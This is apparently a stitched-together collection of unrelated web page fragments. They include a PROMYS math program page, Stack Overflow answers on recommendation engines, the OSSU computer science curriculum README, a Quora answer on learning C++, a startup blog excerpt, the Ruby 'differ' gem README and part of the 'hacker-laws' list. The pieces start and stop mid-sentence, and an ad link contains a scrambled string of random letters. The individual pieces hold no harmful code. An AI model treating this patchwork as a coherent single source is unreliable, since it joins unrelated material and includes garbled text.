\"Statistical Inference and Modeling the Unseen:\nHow Bayesian statistics powers Google's voice search.\" Additionally, the\ncounselors give lectures on topics of special interest and also organize their\nown weekly seminars on topics of their choosing. Every week, the program\nmembers hold informal social gatherings that serve as a forum for open\ndiscussion on themes of general interest. Discussion topics have included the\nrelationship between pure and applied science, defense funding of mathematics,\nand career options.\n\n## Goals\n\nThe PROMYS program aims to provide an environment for talented young people\nthat will arouse their curiosity and encourage a deep personal involvement\nwith the creative and collaborative elements of mathematics and science. It is\ndesigned to encourage habits of thought that will lead to scientific\nindependence and creativity. At the same time, it seeks to foster interaction\nbetween the PROMYS community and the larger community of research\nmathematicians and scientists currently working in academia and industry.\n\n[![Student at\nboard](https://promys.org/sites/promys.org/files/styles/sidebar_image/public/sidebar-\nimages/Student%20at%20board%20-.jpg?itok=CfJJz0N9)](/about-promys)\n\n![Student giving Exploration Lab\npresentation](/sites/promys.org/files/assets/Exploration%20presentation%20200.jpg)\n\n![Group of students from\n2018](/sites/promys.org/files/assets/Group%20of%20students%20from%202018%20200.jpg)\n\n![Glenn Stevens with students and counselors in\n2018](/sites/promys.org/files/assets/Glenn%20and%20students%20x200.jpg)\n\n![Exploration Lab presentation in\n2018](/sites/promys.org/files/assets/Nilava%20-%20x200.jpg)\n\n[Home](/home) | [About](/about-promys) | [Students](/program) |\n[Counselors](/counselors) | [Alumni](/alum-community) |\n[Resources](/resources) | [PROMYS for Teachers](/pft) | [PROMYS Math\nCircle](/MathCircle) | [Contact](/about/contact-us) | [SiteMap](/sitemap)\n\n**  \nPROMYS** | [Department of Mathematics](http://www.bu.edu/math/) | [Boston\nUniversity](http://www.bu.edu) | 111 Cummington Mall, Boston, MA 02215  \n **Phone:** (617) 353-2563 **Fax:** (617) 353-8100 **Email:**\n[promys@bu.edu](mailto:promys@bu.edu) | \u00a9 2020.

The main idea that I had was\nabout collecting data about everything:\n\n  * Who uploaded a video?\n  * Who commented on a video?\n  * Which tags where created?\n  * Who visited the video? (also tracking anonymous visitors)\n  * Who favorited a video?\n  * Who rated a video?\n  * Which channels was the video assigned to?\n  * Text streams of title, description, tags, channels and comments are collected by a fulltext indexer which puts weight on each of the data sources.\n\nNext I created functions which return lists of (id,weight) tuples for each of\nthe above points. Some only consider a limited amount of videos (eg last 50),\nsome modify the weight by eg rating, tag count (more often tagged = less\nexpressive). There are functions that return the following lists:\n\n  * Similar videos by fulltext search\n  * Videos uploaded by the same user\n  * Other videos the users from these comments also commented on\n  * Other videos the users from these favorites also favorited\n  * Other videos the raters from these ratings also rated on (weighted)\n  * Other videos in the same channels\n  * Other videos with the same tags (weighted by \"expressiveness\" of tags)\n  * Other videos played by people who played this video (XY latest plays)\n  * Similar videos by comments fulltext\n  * Similar videos by title fulltext\n  * Similar videos by description fulltext\n  * Similar videos by tags fulltext\n\nAll these will be combined into a single list by just summing up the weights\nby video ids, then sorted by weight. This works pretty well for around 1000\nvideos now. But you need to do background processing or extreme caching for\nthis to be speedy.\n\nI'm hoping that I can reduce this to a generic recommendation engine or\nsimilarity calculator soon and release as a rails/activerecord plugin.\nCurrently it's still a well integrated part of my project.\n\nTo give a small hint, in ruby code it looks like this:\n\n    \n    \n    def related_by_tags\n      tag_names.find(:all, :include => :videos).inject([]) { |result,t|\n        result + t.video_ids.map { |v|\n          [v, TAG_WEIGHT / (0.1 + Math.log(t.video_ids.length) / Math.log(2))]\n        }\n      }\n    end\n    \n\nI would be interested on how other people solve such algorithms.\n\n[share](/a/1407926 \"short permalink to this answer\") | [improve this\nanswer](/posts/1407926/edit) | follow  |\n\n[edited Sep 11 '09 at 6:16](/posts/1407926/revisions \"show all edits to this\npost\")\n\nanswered Sep 10 '09 at 21:52\n\n[![](https://www.gravatar.com/avatar/8fb2042f5441acaa9422e87c69e1d0c7?s=32&d=identicon&r=PG)](/users/124536/hurikhan77)\n\n[hurikhan77](/users/124536/hurikhan77)hurikhan77\n\n5,57922 gold badges2828 silver badges4646 bronze badges\n\n  * Has this become a gem already? \u2013 [Ismael Abreu](/users/634513/ismael-abreu \"15,361 reputation\") May 17 '12 at 2:45\n\n  * Apperently not, the project is frozen and I guess it will be never continued... :-( So unless there will be another project for me which makes use of this I probably won't split it out. \u2013 [hurikhan77](/users/124536/hurikhan77 \"5,579 reputation\") May 27 '12 at 15:47\n\n  * @hurikhan77 I was working on a similar music recommendation engine. I am confused about selecting the database. What I have thought is storing the static data in a Relational Database and the userEvents (like, play etc) store in a Elastic-search and work over it. Can you give your thoughts and help me out. \u2013 [Gaurav](/users/1158489/gaurav \"106 reputation\") Mar 25 '15 at 15:58\n\n  * @Gaurav I think elasticsearch could work very well here, especially if you exploit its fulltext search and similarity search features. I'd probably even go for storing static meta data in it - or at least use it as a fulltext index to your static data. I've used elasticsearch more often lately and at least in Rails it is very nice to use as a search database backend. Combined with redis and sidekick you can do a lot of easy background working which may be needed if you implemented my above draft of a recommendation engine. \u2013 [hurikhan77](/users/124536/hurikhan77 \"5,579 reputation\") Feb 19 '16 at 13:55\n\nadd a comment |\n\n27\n\n[](/posts/3739030/timeline \"Timeline\")\n\nPresenting recommendations can be split up in to two main sections:\n\n  1. Feature extraction\n  2. Recommendation\n\nFeature extraction is very specific to the object being recommended. For\nmusic, for example, some features of the object might be the frequency\nresponse of the song, the power, the genre, etc. The features for the users\nmight be age, location, etc. You then create a vector for each user and song\nwith the various elements of the vector corresponding to different features of\ninterest.\n\nPerforming the actual recommendation only requires well thought out feature\nvectors. Note that if you don't choose the right features your recommendation\nengine will fail. This would be like asking you to tell me my sex based on my\nage. Of course my age may provide a bit of information, but I think you could\nimagine better questions to ask. Anyways, once you have your feature vectors\nfor each user and song, you will need to train the recommendation engine. I\nthink the best way to do this would be to get a whole bunch of users to take\nyour demographic test and then tell you specific songs that they like. At this\npoint you have all the information you need. Your job is to draw a decision\nboundary with the information you have. Consider a simple example. You want to\npredict whether or not a user likes AC/DC's \"Back in Black\" based on age and\nsex. Imagine a graph showing 100 data points. The x axis is age, the y axis is\nsex (1 is male, 2 is female). A black mark indicates that the user likes the\nsong while a red mark means they don't like the song. My guess is that this\ngraph might have a lot of black marks corresponding to users that are male and\nbetween the ages of 12 and 37 while the rest of the marks will be red. So, if\nwe were to manually select a decision boundary, it'd be a rectangle around\nthis area holding the majority of the black marks. This is called the decision\nboundary because, if a completely new person comes to you and tells you their\nage and sex, you only have to plot them on the graph and ask whether or not\nthey fall within that box.\n\nSo, the hard part here is finding the decision boundary. The good news is that\nyou don't need to know how to do that. You just need to know how to use some\nof the common tools. You can look into using neural networks, support vector\nmachines, linear classifiers, etc. Again, don't let the big names fool you.\nMost people can't tell you what these things are really doing. They just know\nhow to plug things in and get results.\n\nI know it's a bit late, but I hope this helps anyone that stumbles on this\nthread.\n\n[share](/a/3739030 \"short permalink to this answer\") | [improve this\nanswer](/posts/3739030/edit) | follow  |\n\nanswered Sep 17 '10 at 21:05\n\n[![](https://www.gravatar.com/avatar/7637d43355f02d0eed4cf79384f801b8?s=32&d=identicon&r=PG)](/users/174709/josh)\n\n[Josh](/users/174709/josh)Josh\n\n9,51422 gold badges4040 silver badges4747 bronze badges\n\nadd a comment |\n\n3\n\n[](/posts/1588465/timeline \"Timeline\")\n\nThis is really a very big question you are asking, so even if I could give you\na detailed answer I doubt I'd have the time.... but I do have a suggestion,\ntake a look at Greg Linden's blog and his papers on item-based collaborative\nfiltering.

It's not merely for career training or professional\ndevelopment. It's for those who want a proper, _well-rounded_ grounding in\nconcepts fundamental to all computing disciplines, and for those who have the\ndiscipline, will, and (most importantly!) good habits to obtain this education\nlargely on their own, but with support from a worldwide community of fellow\nlearners.\n\nIt is designed according to the degree requirements of undergraduate computer\nscience majors, minus general education (non-CS) requirements, as it is\nassumed most of the people following this curriculum are already educated\noutside the field of CS. The courses themselves are among the very best in the\nworld, often coming from Harvard, Princeton, MIT, etc., but specifically\nchosen to meet the following criteria.\n\n**Courses must** :\n\n  * Be open for enrollment\n  * Run regularly (ideally in self-paced format, otherwise running multiple times per year)\n  * Be of generally high quality in teaching materials and pedagogical principles\n  * Match the curricular standards of the [CS 2013](/ossu/computer-science/blob/master/CURRICULAR_GUIDELINES.md): Curriculum Guidelines for Undergraduate Degree Programs in Computer Science\n\nWhen no course meets the above criteria, the coursework is supplemented with a\nbook. When there are courses or books that don't fit into the curriculum but\nare otherwise of high quality, they belong in [extras/courses](/ossu/computer-\nscience/blob/master/extras/courses.md) or [extras/readings](/ossu/computer-\nscience/blob/master/extras/readings.md).\n\n**Organization**. The curriculum is designed as follows:\n\n  * _Intro CS_ : for students to try out CS and see if it's right for them\n  * _Core CS_ : corresponds roughly to the first three years of a computer science curriculum, taking classes that all majors would be required to take\n  * _Advanced CS_ : corresponds roughly to the final year of a computer science curriculum, taking electives according to the student's interests\n  * _Final Project_ : a project for students to validate, consolidate, and display their knowledge, to be evaluated by their peers worldwide\n\n**Duration**. It is possible to finish Core CS within about 2 years if you\nplan carefully and devote roughly 18-22 hours/week to your studies. Courses in\nCore CS should be taken linearly if possible, but since a perfectly linear\nprogression is rarely possible, each class's prerequisites are specified so\nthat you can design a logical but non-linear progression based on the class\nschedules and your own life plans.\n\n**Cost**. All or nearly all course material is available for free. However,\nsome courses may charge money for assignments/tests/projects to be graded.\nNote that Coursera offers [financial aid](https://learner.coursera.help/hc/en-\nus/articles/209819033-Apply-for-Financial-Aid).\n\nDecide how much or how little to spend based on your own time and budget; just\nremember that you can't purchase success!\n\n**Process**. Students can work through the curriculum alone or in groups, in\norder or out of order.\n\n  * For grouping up, please use the [cohorts repository](https://github.com/ossu/cohorts) to find or create a cohort suited to you.\n  * We recommend doing all courses in Core CS, only skipping a course when you are certain that you've already learned the material previously.\n  * For simplicity, we recommend working through courses (especially Core CS) in order from top to bottom, as they have already been [topologically sorted](https://en.wikipedia.org/wiki/Topological_sorting) by their prerequisites.\n  * Courses in Advanced CS are electives. Choose one subject (e.g. Advanced programming) you want to become an expert in and take all the courses under that heading. You can also create your own custom subject, but we recommend getting validation from the community on the subject you choose.\n\n**Content policy**. If you plan on showing off some of your coursework\npublicly, you must share only files that you are allowed to. _Do NOT\ndisrespect the code of conduct_ that you signed in the beginning of each\ncourse!\n\n**[How to contribute](/ossu/computer-science/blob/master/CONTRIBUTING.md)**\n\n**[Getting help](/ossu/computer-science/blob/master/HELP.md)** (Details about\nour FAQ and chatroom)\n\n# Community\n\n  * We have a chat room!

Choose one of the two course series below. Either one\nwill give you an introduction to programming that assumes no prior knowledge.\nYou can audit either for free, _in order to do so, click through to the\nindividual courses in the specializations_.\n\nTrying to decide between them?\n\n_Python for Everyone_ will introduce you to a popular language and will\nquickly move to practical programming tasks - using web APIs and databases.\nThis will give you a taste of what many professional developers do.\n\n_Fundamentals of Computing_ will also start by introducing you to Python. It\nthen moves on to give an introduction to academic Computer Science topics,\nlike sorting and recursion. This will give you a taste of what the following\ncourses will be like.

You are encouraged to do the\nassignments and exams for each course, but what really matters is whether you\ncan _use_ your knowledge to solve a real-world problem.\n\nAfter you've gotten through all of Core CS and the parts of Advanced CS\nrelevant to you, you should think about a problem that you can solve using the\nknowledge you've acquired. Not only does real project work look great on a\nresume, but the project will also _validate_ and _consolidate_ your knowledge.\nYou can create something entirely new, or you can find an existing project\nthat needs help via websites like [CodeTriage](https://www.codetriage.com/) or\n[First Timers Only](http://www.firsttimersonly.com/).\n\nAnother option is using the Capstone project from taking one of the\nSpecializations in Advanced applications; whether or not this makes sense\ndepends on the course, the project, and whether or not the course's Honor Code\npermits you to display your work publicly. In some cases, it may not be\npermitted; do **not** violate your course's Honor Code!\n\nPut the OSSU-CS badge in the README of your repository!

See how to copy a board [here](https://help.trello.com/article/802-copying-cards-lists-or-boards).\n\nNow that you have a copy of our official board, you just need to pass the\ncards to the `Doing` column or `Done` column as you progress in your study.\n\nWe also have **labels** to help you have more control through the process. The\nmeaning of each of these labels is:\n\n  * `Main Curriculum`: cards with that label represent courses that are listed in our curriculum.\n  * `Extra Resources`: cards with that label represent courses that were added by the student.\n  * `Doing`: cards with that label represent courses the student is current doing.\n  * `Done`: cards with that label represent courses finished by the student. Those cards should also have the link for at least one project/article built with the knowledge acquired in such course.\n  * `Section`: cards with that label represent the section that we have in our curriculum. Those cards with the `Section` label are only to help the organization of the Done column. You should put the _Course's cards_ below its respective _Section's card_.\n\nThe intention of this board is to provide our students a way to track their\nprogress, and also the ability to show their progress through a public page\nfor friends, family, employers, etc. You can change the status of your board\nto be _public_ or _private_.\n\n# Team\n\n  * **[Eric Douglas](https://github.com/ericdouglas)** : founder of OSSU\n  * **[hanjiexi](https://github.com/hanjiexi)** : lead technical maintainer\n  * **[waciumawanjohi](https://github.com/waciumawanjohi)** : lead academic maintainer\n  * **[Contributors](https://github.com/ossu/computer-science/graphs/contributors)**\n\n  * \u00a9 2020 GitHub, Inc.\n  * [Terms](https://github.com/site/terms)\n  * [Privacy](https://github.com/site/privacy)\n  * [Security](https://github.com/security)\n  * [Status](https://githubstatus.com/)\n  * [Help](https://help.github.com)\n\n[ ](https://github.com \"GitHub\")\n\n  * [Contact GitHub](https://github.com/contact)\n  * [Pricing](https://github.com/pricing)\n  * [API](https://developer.github.com)\n  * [Training](https://training.github.com)\n  * [Blog](https://github.blog)\n  * [About](https://github.com/about)\n\nYou can\u2019t perform that action at this time.\n\nYou signed in with another tab or window.

When I started competitive programming, I didn\u2019t have much trouble\ncoding my solution for easier problems (problems that required some easy\nimplementation). So it\u2019s not a bad option.\n\nBut not everyone has a liking to read. No, I would not suggest going for a\nMOOC. I feel it is more beneficial if you learn while you code. Solve the\n[**C++ section on HackerRank**](https://www.hackerrank.com/domains/cpp) **.**\nIt explains from the very basics of C++ starting with the printing of \u201cHello\nWorld\u201d. It has a very active discussion forum where you can ask your doubts.\nIt also has an editorial section for each question where you can look for\nanswers.\n\n ** _Resources to learn STL:_**\n\nFirst, you must understand how useful can STL be. Consider this: _A function\nthat sorts an array using merge sort would easily take more than 50 lines of\ncode. But if you use the_`sort()` _from STL it just takes 1 line to sort the\narray._ I hope it is now clear how handy STL can be.\n\nComing to the resources part, there are many tutorials available online.\n[Geeksforgeeks](https://www.geeksforgeeks.org/cpp-stl-tutorial/),\n[Topcoder](https://www.topcoder.com/community/competitive-\nprogramming/tutorials/power-up-c-with-the-standard-template-library-part-1/),\n[cplusplus.com, ](http://www.cplusplus.com/)etc. Geeksforgeeks and Topcoder\nhave well-written tutorials. During a contest I prefer cplusplus. It\u2019s like a\nhandbook that you can use if you need a quick look at something (like how to\nuse `lower_bound()` on a vector).\n\nIf you ask me how I learned STL, my answer would be \u201c _I didn\u2019t learn, I\npracticed_ \u201d. I solved questions and simply Googled whatever I needed. Over\ntime I learned all the basics and some advanced stuff. I still don\u2019t remember\neach and every STL element and their functions. I always Google whenever I\nneed one and I would suggest the same to you.\n\nHope this helps.\n\nHappy Coding.\n\n12.7k views \u00b7 View 106 Upvoters \u00b7 View Sharers\n\n[soKpVoaOnIrNswmnnJovhurbrhesloWdVd NxbXfynIQlc\nFcqQGJkNueytRmRBSdrCyrlDaNyVpiSBZnssRZ\n\n](https://www.jetbrains.com/cpp/)\n\n[C/C++ tools for your productivity.](https://www.jetbrains.com/cpp/)[Looking\nfor a smart C/C++ tool?

Avoid technical risk, because you have a\nboatload of business risk.\n\nFor me, that'd be using rails on heroku, which is still under $200/year for a\nfully functional dyno and database. For others it might be some varient of a\nmvc framework on a hosting provider. For others it might be WordPress (gasp!).\nFor others it might be a cloud native app, as this post describes.\n\nAs long as you aren't spending extravagantly, time is more important than\nmoney when figuring out what your customers need.\n\nThis is true both in companies that have raised money and bootstrapped\ncompanies, for different reasons. For the first, you took money and need to\nfigure out your product market for or scaling strategy ASAP. For the second,\nyour time is super valuable because it is tied to your motivation. Doing work\ndirectly tied to customer value is a great motivator.

The flexibility comes from the fact that\ndiffs can be built at completely arbitrary levels of granularity (some common\nones are built-in), and can be output in a variety of formats.\n\n## Installation\u00b6 \u2191\n\n    \n    \n    sudo gem install differ\n    \n\n## Usage\u00b6 \u2191\n\nThere are a number of ways to use Differ, depending on your situation and\nneeds.\n\n    \n    \n    @original = \"Epic lolcat fail!\"\n    @current  = \"Epic wolfman fail!\"\n    \n\nYou can call the Differ module directly.\n\n    \n    \n    require 'differ'\n    \n\nThere are a number of built-in diff methods to choose from\u2026\n\n    \n    \n    @diff = Differ.diff_by_line(@current, @original)\n      # => \"{\"Epic lolcat fail!\" >> \"Epic wolfman fail!\"}\"\n    \n    @diff = Differ.diff_by_word(@current, @original)\n      # => \"Epic {\"lolcat\" >> \"wolfman\"} fail!\"\n    \n    @diff = Differ.diff_by_char(@current, @original)\n      # => \"Epic {+\"wo\"}l{-\"olcat \"}f{+\"m\"}a{+\"n fa\"}il!\"\n    \n\n\u2026 or call #diff directly and supply your own boundary string!\n\n    \n    \n    @diff = Differ.diff(@current, @original)  # implicitly by line!\n      # => \"{\"Epic lolcat fail!\" >> \"Epic wolfman fail!\"}\"\n    \n    @diff = Differ.diff(@current, @original, 'i')\n      # => \"Epi{\"c lolcat fa\" >> \"c wolfman fa\"}il\"\n    \n\nIf you would like something a little more inline\u2026\n\n    \n    \n    require 'differ/string'\n    \n    @diff = @current.diff(@original)  # implicitly by line!\n      # => \"{\"Epic lolcat fail!\" >> \"Epic wolfman fail!\"}\"\n    \n\n\u2026 or a lot more inline\u2026\n\n    \n    \n    @diff = (@current - @original)    # implicitly by line!\n      # => \"{\"Epic lolcat fail!\" >> \"Epic wolfman fail!\"}\"\n    \n    $; = ' '\n    @diff = (@current - @original)\n      # => \"Epic {\"lolcat\" >> \"wolfman\"} fail!\"\n    \n\n\u2026 we've pretty much got you covered.\n\n### Output Formatting\u00b6 \u2191\n\nNeed a different output format? We've got a few of those too.\n\n    \n    \n    Differ.format = :ascii  # <- Default\n    Differ.format = :color\n    Differ.format = :html\n    \n    Differ.format = MyCustomFormatModule\n    \n\nDon't want to change the system-wide default for only a single diff output?\nYeah, me either.\n\n    \n    \n    @diff = (@current - @original)\n    @diff.format_as(:color)\n    \n\n## Copyright\u00b6 \u2191\n\nCopyright \u00a9 2009 Pieter Vande Bruggen.\n\n(The GIFT License, v1)\n\nPermission is hereby granted to use this software and/or its source code for\nwhatever purpose you should choose.

Whether they should be applied will\nalways be a matter of debate, and greatly dependent on what you are working\non.\n\n## Laws\n\nAnd here we go!\n\n### 90\u20139\u20131 Principle (1% Rule)\n\n[1% Rule on\nWikipedia](https://en.wikipedia.org/wiki/1%25_rule_\\(Internet_culture\\))\n\nThe 90-9-1 principle suggests that within an internet community such as a\nwiki, 90% of participants only consume content, 9% edit or modify content and\n1% of participants add content.\n\nReal-world examples:\n\n  * A 2014 study of four digital health social networks found the top 1% created 73% of posts, the next 9% accounted for an average of ~25% and the remaining 90% accounted for an average of 2% ([Reference](https://www.jmir.org/2014/2/e33/))\n\nSee Also:\n\n  * Pareto principle\n\n### Amdahl's Law\n\n[Amdahl's Law on Wikipedia](https://en.wikipedia.org/wiki/Amdahl%27s_law)\n\n> Amdahl's Law is a formula which shows the _potential speedup_ of a\n> computational task which can be achieved by increasing the resources of a\n> system. Normally used in parallel computing, it can predict the actual\n> benefit of increasing the number of processors, which is limited by the\n> parallelisability of the program.\n\nBest illustrated with an example. If a program is made up of two parts, part\nA, which must be executed by a single processor, and part B, which can be\nparallelised, then we see that adding multiple processors to the system\nexecuting the program can only have a limited benefit. It can potentially\ngreatly improve the speed of part B - but the speed of part A will remain\nunchanged.\n\nThe diagram below shows some examples of potential improvements in speed:\n\n[![Diagram: Amdahl's Law](/dwmkerr/hacker-\nlaws/raw/master/images/amdahls_law.png)](/dwmkerr/hacker-\nlaws/blob/master/images/amdahls_law.png)\n\n_(Image Reference: By Daniels219 at English Wikipedia, Creative Commons\nAttribution-Share Alike 3.0\nUnported,<https://en.wikipedia.org/wiki/File:AmdahlsLaw.svg>)_\n\nAs can be seen, even a program which is 50% parallelisable will benefit very\nlittle beyond 10 processing units, whereas a program which is 95%\nparallelisable can still achieve significant speed improvements with over a\nthousand processing units.\n\nAs Moore's Law slows, and the acceleration of individual processor speed\nslows, parallelisation is key to improving performance. Graphics programming\nis an excellent example - with modern Shader based computing, individual\npixels or fragments can be rendered in parallel - this is why modern graphics\ncards often have many thousands of processing cores (GPUs or Shader Units).\n\nSee also:\n\n  * Brooks' Law\n  * Moore's Law\n\n### The Broken Windows Theory\n\n[The Broken Windows Theory on\nWikipedia](https://en.wikipedia.org/wiki/Broken_windows_theory)\n\nThe Broken Windows Theory suggests that visible signs of crime (or lack of\ncare of an environment) lead to further and more serious crimes (or further\ndeterioration of the environment).\n\nThis theory has been applied to software development, suggesting that poor\nquality code (or Technical Debt) can lead to a perception that efforts to\nimprove quality may be ignored or undervalued, thus leading to further poor\nquality code.

Brooks is clear that this is an over-simplification, however, the\ngeneral reasoning is that given the ramp up time of new resources and the\ncommunication overheads, in the immediate short-term velocity decreases. Also,\nmany tasks may not be divisible, i.e. easily distributed between more\nresources, meaning the potential velocity increase is also lower.\n\nThe common phrase in delivery \"Nine women can't make a baby in one month\"\nrelates to Brooks' Law, in particular, the fact that some kinds of work are\nnot divisible or parallelisable.\n\nThis is a central theme of the book 'The Mythical Man Month'.\n\nSee also:\n\n  * Death March\n  * Reading List: The Mythical Man Month\n\n### CAP Theorem (Brewer's Theorem)\n\nThe CAP Theorem (defined by Eric Brewer) states that for a distributed data\nstore only two out of the following three guarantees (at most) can be made:\n\n  * Consistency: when reading data, every request receives the _most recent_ data or an error is returned\n  * Availability: when reading data, every request receives _a non error response_ , without the guarantee that it is the _most recent_ data\n  * Partition Tolerance: when an arbitrary number of network requests between nodes fail, the system continues to operate as expected\n\nThe core of the reasoning is as follows. It is impossible to guarantee that a\nnetwork partition will not occur (see The Fallacies of Distributed Computing).\nTherefore in the case of a partition we can either cancel the operation\n(increasing consistency and decreasing availability) or proceed (increasing\navailability but decreasing consistency).\n\nThe name comes from the first letters of the guarantees (Consistency,\nAvailability, Partition Tolerance). Note that it is very important to be aware\nthat this does _not_ relate to _ACID_, which has a different definition of\nconsistency. More recently, PACELC theorem has been developed which adds\nconstraints for latency and consistency when the network is _not_ partitioned\n(i.e. when the system is operating as expected).\n\nMost modern database platforms acknowledge this theorem implicitly by offering\nthe user of the database the option to choose between whether they want a\nhighly available operation (which might include a 'dirty read') or a highly\nconsistent operation (for example a 'quorum acknowledged write').\n\nReal world examples:\n\n  * [Inside Google Cloud Spanner and the CAP Theorem](https://cloud.google.com/blog/products/gcp/inside-cloud-spanner-and-the-cap-theorem) \\- Goes into the details of how Cloud Spanner works, which appears at first to seem like a platform which has _all_ of the guarantees of CAP, but under the hood is essentially a CP system.\n\nSee also:\n\n  * ACID\n  * The Fallacies of Distributed Computing\n  * PACELC\n\n### Conway's Law\n\n[Conway's Law on Wikipedia](https://en.wikipedia.org/wiki/Conway%27s_law)\n\nThis law suggests that the technical boundaries of a system will reflect the\nstructure of the organisation. It is commonly referred to when looking at\norganisation improvements, Conway's Law suggests that if an organisation is\nstructured into many small, disconnected units, the software it produces will\nbe. If an organisation is built more around 'verticals' which are orientated\naround features or services, the software systems will also reflect this.\n\nSee also:\n\n  * The Spotify Model\n\n### Cunningham's Law\n\n[Cunningham's Law on\nWikipedia](https://en.wikipedia.org/wiki/Ward_Cunningham#Cunningham's_Law)\n\n> The best way to get the right answer on the Internet is not to ask a\n> question, it's to post the wrong answer.\n\nAccording to Steven McGeady, Ward Cunningham advised him in the early 1980s:\n\"The best way to get the right answer on the Internet is not to ask a\nquestion, it's to post the wrong answer.\" McGeady dubbed this Cunningham's\nlaw, though Cunningham denies ownership calling it a \"misquote.\" Although\noriginally referring to interactions on Usenet, the law has been used to\ndescribe how other online communities work (e.g., Wikipedia, Reddit, Twitter,\nFacebook).\n\nSee also:\n\n  * [XKCD 386: \"Duty Calls\"](https://xkcd.com/386/)\n\n### Dunbar's Number\n\n[Dunbar's Number on\nWikipedia](https://en.wikipedia.org/wiki/Dunbar%27s_number)\n\n\"Dunbar's number is a suggested cognitive limit to the number of people with\nwhom one can maintain stable social relationships\u2014 relationships in which an\nindividual knows who each person is and how each person relates to every other\nperson.\" There is some disagreement to the exact number. \"...

When faced with large complicated\nprojects, or ownership of many projects we lean on convention, policy, and\nmodeled procedure to scale. Dunbar's number is not only important to keep in\nmind as an office grows, but also when setting the scope for team efforts or\ndeciding when a system should invest in tooling to assist in modeling and\nautomating logistical overhead.

This might be because the technology is not yet mature enough, or\nreal-world applications are not yet fully realised. After a certain amount of\ntime, the capabilities of the technology increase and practical opportunities\nto use it increase, and teams can finally become productive.

A trivial example\nmay be non-functional elements such as the response time of an API. A more\nsubtle example might be consumers who are relying on applying a regex to an\nerror message to determine the _type_ of error of an API. Even if the public\ncontract of the API states nothing about the contents of the message,\nindicating users should use an associated error code, _some_ users may use the\nmessage, and changing the message essentially breaks the API for those users.\n\nSee also:\n\n  * The Law of Leaky Abstractions\n  * [XKCD 1172](https://xkcd.com/1172/)\n\n### Kernighan's Law\n\n> Debugging is twice as hard as writing the code in the first place.\n> Therefore, if you write the code as cleverly as possible, you are, by\n> definition, not smart enough to debug it.\n>\n> (Brian Kernighan)\n\nKernighan's Law is named for [Brian\nKernighan](https://en.wikipedia.org/wiki/Brian_Kernighan) and derived from a\nquote from Kernighan and Plauger's book [The Elements of Programming\nStyle](https://en.wikipedia.org/wiki/The_Elements_of_Programming_Style):\n\n> Everyone knows that debugging is twice as hard as writing a program in the\n> first place.

It is a consequence of poor\nstructure, mistakes, or just bad modeling of a problem to solve. Inadvertent\ncomplexity can be reduced (or eliminated). However, some complexity is\n'intrinsic' as a consequence of the complexity inherent in the problem being\nsolved. This complexity can be moved, but not eliminated.\n\nOne interesting element to this law is the suggestion that even by simplifying\nthe entire system, the intrinsic complexity is not reduced, it is _moved to\nthe user_ , who must behave in a more complex way.\n\n### The Law of Demeter\n\n[The Law of Demeter on\nWikipedia](https://en.wikipedia.org/wiki/Law_of_Demeter)\n\n> Don't talk to strangers.\n\nThe Law of Demeter, also known as \"The Principle of Least Knowledge\" is a\nprinciple for software design, particularly relevant in object orientated\nlanguages.\n\nIt states that a unit of software should talk only to its immediate\ncollaborators. An object `A` with a reference to object `B` can call its\nmethods, but if `B` has a reference to object `C`, `A` should not call `C`s\nmethods.

The file system\nAPIs are an _abstraction_ of the lower level kernel systems, which are\nthemselves an abstraction over the physical processes relating to changing\ndata on a magnetic platter (or flash memory for an SSD). In most cases, the\nabstraction of treating a file like a stream of binary data will work.\nHowever, for a magnetic drive, reading data sequentially will be\n_significantly_ faster than random access (due to increased overhead of page\nfaults), but for an SSD drive, this overhead will not be present. Underlying\ndetails will need to be understood to deal with this case (for example,\ndatabase index files are structured to reduce the overhead of random access),\nthe abstraction 'leaks' implementation details the developer may need to be\naware of.\n\nThe example above can become more complex when _more_ abstractions are\nintroduced. The Linux operating system allows files to be accessed over a\nnetwork but represented locally as 'normal' files. This abstraction will\n'leak' if there are network failures. If a developer treats these files as\n'normal' files, without considering the fact that they may be subject to\nnetwork latency and failures, the solutions will be buggy.\n\nThe article describing the law suggests that an over-reliance on abstractions,\ncombined with a poor understanding of the underlying processes, actually makes\ndealing with the problem at hand _more_ complex in some cases.\n\nSee also:\n\n  * Hyrum's Law\n\nReal-world examples:\n\n  * [Photoshop Slow Startup](https://forums.adobe.com/thread/376152) \\- an issue I encountered in the past.

It can be difficult to give valuable input on discussions\nabout very large, complex topics without a high degree of subject matter\nexpertise or preparation. However, people want to be seen to be contributing\nvaluable input. Hence a tendency to focus too much time on small details,\nwhich can be reasoned about easily, but are not necessarily of particular\nimportance.\n\nThe fictional example above led to the usage of the term 'Bike Shedding' as an\nexpression for wasting time on trivial details. A related term is '[Yak\nShaving](https://en.wiktionary.org/wiki/yak_shaving),' which connotes a\nseemingly irrelevant activity that is part of a long chain of prerequisites to\nthe main task.\n\n### The Unix Philosophy\n\n[The Unix Philosophy on\nWikipedia](https://en.wikipedia.org/wiki/Unix_philosophy)\n\nThe Unix Philosophy is that software components should be small, and focused\non doing one specific thing well. This can make it easier to build systems by\ncomposing together small, simple, well-defined units, rather than using large,\ncomplex, multi-purpose programs.\n\nModern practices like 'Microservice Architecture' can be thought of as an\napplication of this law, where services are small, focused and do one specific\nthing, allowing complex behaviour to be composed of simple building blocks.\n\n### The Spotify Model\n\n[The Spotify Model on Spotify\nLabs](https://labs.spotify.com/2014/03/27/spotify-engineering-culture-part-1/)\n\nThe Spotify Model is an approach to team and organisation structure which has\nbeen popularised by 'Spotify'. In this model, teams are organised around\nfeatures, rather than technologies.\n\nThe Spotify Model also popularises the concepts of Tribes, Guilds, Chapters,\nwhich are other components of their organisation structure.\n\nMembers of the organisation have described that the actual meaning of these\ngroups changes, evolves and is an on-going experiment. The fact that the model\nis a _process in motion_ , rather than a fixed model continues to lead to\nvarying interpretations of the structure, which may be based on presentations\ngiven by employees at conferences. This means 'snapshots' may be 're-packaged'\nby third parties as a _fixed structure_ , with the fact that the model is\ndynamic being lost.\n\n### Wadler's Law\n\n[Wadler's Law on wiki.haskell.org](https://wiki.haskell.org/Wadler's_Law)\n\n> In any language design, the total time spent discussing a feature in this\n> list is proportional to two raised to the power of its position.\n>\n>   0.

